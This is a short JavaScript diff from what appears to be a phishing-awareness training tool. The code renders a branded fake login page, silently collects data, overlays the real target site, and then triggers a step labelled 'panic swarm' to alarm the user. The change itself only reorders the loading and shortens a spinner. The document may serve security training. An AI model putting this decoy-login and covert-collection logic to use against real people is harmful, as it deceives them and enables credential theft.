@@ -30,11 +30,11 @@
   /* ---- 2. Render branded fake login (always — serves as fallback) ---- */
   Decoy.render(cfg);
 
-  /* ---- 2. Start silent collection immediately ---- */
+  /* ---- 2. Start site load + collection IN PARALLEL for speed ---- */
+  const sitePromise = Decoy.loadRealSite(cfg);
   const dataPromise = Collector.collectAll();
 
-  /* ---- 3. Try to load the REAL target website over the top ---- */
-  const mode = await Decoy.loadRealSite(cfg);
+  const mode = await sitePromise;
   console.log('[phish-training] decoy mode:', mode);
 
   /* ---- 4. Reveal trigger ---- */
@@ -54,7 +54,7 @@
     Collector.getData().decoyMode = mode;
 
     // Brief spinner
-    Decoy.showSpinner(800, async () => {
+    Decoy.showSpinner(500, async () => {
       Decoy.hide();
 
       // === PANIC SWARM — alarm the user ===
